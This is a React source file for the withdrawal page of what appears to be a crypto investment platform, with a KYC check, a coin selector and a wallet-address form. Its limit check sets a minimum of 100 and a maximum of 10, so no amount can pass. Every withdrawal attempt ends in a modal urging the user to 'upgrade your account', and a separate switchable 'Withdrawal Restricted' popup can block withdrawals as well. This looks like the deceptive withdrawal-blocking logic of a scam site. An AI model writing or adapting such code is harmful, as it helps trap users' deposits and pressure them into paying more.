import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaTimes, FaInfoCircle } from 'react-icons/fa';
import toast from 'react-hot-toast';
import Navbar from '../components/Navbar';
import { walletService } from '../services/walletService';
import { useAuth } from '../auth/userAuth';
import { getCurrencySymbol } from '../utils/currency';
import API from '../utils/axios';

// ✅ HARDCODED WITHDRAWAL SETTINGS – limit removed
const WITHDRAWAL_SETTINGS = {
  popupEnabled: false,      // true = show popup, false = allow withdrawal
  popupTitle: 'Withdrawal Restricted',
  popupMessage: 'Withdrawal is currently restricted. Please contact support for assistance.',
};

// ✅ WITHDRAWAL LIMIT CONSTANTS
const MIN_WITHDRAWAL = 100;
const ACCOUNT_LIMIT = 10;

const Withdraw = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [amount, setAmount] = useState('');
  const [crypto, setCrypto] = useState('USDT');
  const [address, setAddress] = useState('');
  const [loading, setLoading] = useState(false);
  const [walletBalance, setWalletBalance] = useState(0);
  const [showLimitModal, setShowLimitModal] = useState(false);
  const [kycStatus, setKycStatus] = useState('checking'); // 'checking', 'pending', 'verified', 'rejected'
  const [modalTitle, setModalTitle] = useState(WITHDRAWAL_SETTINGS.popupTitle);
  const [modalMessage, setModalMessage] = useState(WITHDRAWAL_SETTINGS.popupMessage);

  const currencySymbol = getCurrencySymbol(user?.currency);

  useEffect(() => {
    const checkKYC = async () => {
      try {
        const response = await API.get('/kyc/status');
        if (response.data.success) {
          setKycStatus(response.data.data.status);
        }
      } catch (error) {
        console.error('KYC status check error:', error);
        setKycStatus('error');
      }
    };
    checkKYC();
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const wallet = await walletService.getWallet();
        setWalletBalance(wallet.balance || 0);
      } catch (error) {
        console.error('Failed to fetch wallet:', error);
      }
    };
    fetchData();
  }, []);

  const cryptos = [
    { id: 'USDT', name: 'Tether', icon: FaBitcoin, color: 'text-green-500' },
    { id: 'BTC', name: 'Bitcoin', icon: FaBitcoin, color: 'text-orange-500' },
    { id: 'ETH', name: 'Ethereum', icon: FaEthereum, color: 'text-purple-500' },
    { id: 'BNB', name: 'BNB', icon: FaBitcoin, color: 'text-yellow-500' },
    { id: 'TRX', name: 'Tron', icon: FaBitcoin, color: 'text-red-500' },
  ];

  const handleSubmit = (e) => {
    e.preventDefault();

    const amountNum = parseFloat(amount);

    if (!amount || amountNum < 1) {
      toast.error('Please enter a valid amount');
      return;
    }

    // ✅ KYC check – only verified users can withdraw
    if (kycStatus !== 'verified') {
      toast.error('KYC verification required. Please complete your KYC to withdraw.');
      return;
    }

    // ✅ WITHDRAWAL LIMIT CHECK – show upgrade modal if amount is outside allowed range
    if (amountNum < MIN_WITHDRAWAL || amountNum > ACCOUNT_LIMIT) {
      setModalTitle('Withdrawal Limit');
      setModalMessage(
        `Your current withdrawal limit is ${ACCOUNT_LIMIT} and the minimum withdrawal is ${MIN_WITHDRAWAL}. Please upgrade your account to complete this withdrawal.`
      );
      setShowLimitModal(true);
      return;
    }

    // ✅ Popup check (if enabled, show modal and abort)
    if (WITHDRAWAL_SETTINGS.popupEnabled) {
      setModalTitle(WITHDRAWAL_SETTINGS.popupTitle);
      setModalMessage(WITHDRAWAL_SETTINGS.popupMessage);
      setShowLimitModal(true);
      return;
    }

    // ✅ Balance check
    if (amountNum > walletBalance) {
      toast.error('Insufficient balance');
      return;
    }

    if (!address) {
      toast.error('Please enter a wallet address');
      return;
    }

    proceedWithdrawal(amountNum);
  };

  const proceedWithdrawal = async (amountNum) => {
    setLoading(true);
    try {
      const response = await API.post('/transactions', {
        type: 'withdrawal',
        amount: amountNum,
        currency: 'USD',
        description: `Withdrawal to ${crypto} wallet`,
        metadata: {
          cryptoCurrency: crypto,
          walletAddress: address,
        },
        status: 'pending',
      });

      if (response.data.success) {
        toast.success('Withdrawal request submitted!');
        navigate('/transactions');
      }
    } catch (error) {
      toast.error(error.response?.data?.message || 'Withdrawal failed');
    } finally {
      setLoading(false);
    }
  };

  const formatCurrency = (value) => {
    return `${currencySymbol}${value?.toLocaleString() || '0.00'}`;
  };

  const handleModalClose = () => {
    setShowLimitModal(false);
  };

  const isKycVerified = kycStatus === 'verified';

  return (
    <div className="min-h-screen bg-slate-900 pt-16 lg:pl-64 pb-20 lg:pb-0">
      <Navbar />
      <div className="p-4 sm:p-6 max-w-2xl mx-auto">
        <div className="mb-6">
          <h1 className="text-2xl sm:text-3xl font-bold text-white">Withdraw Funds</h1>
          <p className="text-slate-400 mt-1">Withdraw your earnings</p>
        </div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-800/50 backdrop-blur-xl rounded-2xl p-6 border border-slate-700"
        >
          <div className="bg-slate-900 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-slate-400">Available Balance</span>
              <span className="text-xl font-bold text-white">{formatCurrency(walletBalance)}</span>
            </div>
          </div>

          {/* KYC Status Warning */}
          {!isKycVerified && (
            <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg flex items-center gap-3">
              <FaLock className="text-red-500 text-sm" />
              <p className="text-red-400 text-sm">
                {kycStatus === 'pending'
                  ? 'Your KYC is pending approval. Please wait for verification.'
                  : 'KYC verification required to withdraw. Please complete your KYC first.'}
              </p>
            </div>
          )}

          {/* Popup Warning (only when popup is enabled and KYC verified) */}
          {WITHDRAWAL_SETTINGS.popupEnabled && isKycVerified && (
            <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
              <FaInfoCircle className="text-blue-500 text-sm" />
              <p className="text-blue-400 text-sm">{WITHDRAWAL_SETTINGS.popupMessage}</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Select Cryptocurrency</label>
              <div className="grid grid-cols-3 sm:grid-cols-5 gap-2">
                {cryptos.map((c) => (
                  <button
                    key={c.id}
                    type="button"
                    onClick={() => setCrypto(c.id)}
                    className={`p-3 rounded-lg border transition ${
                      crypto === c.id
                        ? 'border-blue-500 bg-blue-500/10'
                        : 'border-slate-700 hover:border-slate-500'
                    }`}
                  >
                    <c.icon className={`w-6 h-6 mx-auto ${c.color}`} />
                    <span className="text-xs text-slate-400 mt-1 block">{c.id}</span>
                  </button>
                ))}
              </div>
            </div>

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Amount ({user?.currency || 'USD'})</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">
                  {currencySymbol}
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Enter amount"
                  min="1"
                  step="0.01"
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                />
              </div>
            </div>

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Wallet Address</label>
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder="Enter your wallet address"
                className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
              />
            </div>

            <button
              type="submit"
              disabled={loading || !isKycVerified}
              className="w-full py-3 rounded-lg bg-gradient-to-r from-orange-600 to-red-600 text-white font-semibold hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  <FaArrowDown className="text-sm" /> Request Withdrawal
                </>
              )}
            </button>
          </form>
        </motion.div>
      </div>

      {/* Withdrawal Popup Modal */}
      <AnimatePresence>
        {showLimitModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="bg-slate-800 rounded-2xl max-w-md w-full border border-slate-700 shadow-2xl overflow-hidden"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex justify-between items-center px-6 py-4 bg-gradient-to-r from-blue-600/20 to-purple-600/20 border-b border-slate-700">
                <div className="flex items-center gap-3">
                  <FaLock className="text-blue-500 text-xl" />
                  <h2 className="text-xl font-bold text-white">{modalTitle}</h2>
                </div>
                <button onClick={handleModalClose} className="p-2 hover:bg-slate-700 rounded-lg transition">
                  <FaTimes className="text-slate-400" />
                </button>
              </div>

              <div className="p-6 space-y-4">
                <div className="flex items-start gap-3 p-3 bg-blue-500/10 border border-blue-500/20 rounded-lg">
                  <FaInfoCircle className="text-blue-500 text-lg mt-0.5 flex-shrink-0" />
                  <p className="text-slate-200 text-sm leading-relaxed">{modalMessage}</p>
                </div>
              </div>

              <div className="px-6 py-4 border-t border-slate-700 flex flex-col gap-3">
                <button
                  onClick={handleModalClose}
                  className="w-full py-2 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-lg hover:opacity-90 transition"
                >
                  I Understand
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default Withdraw;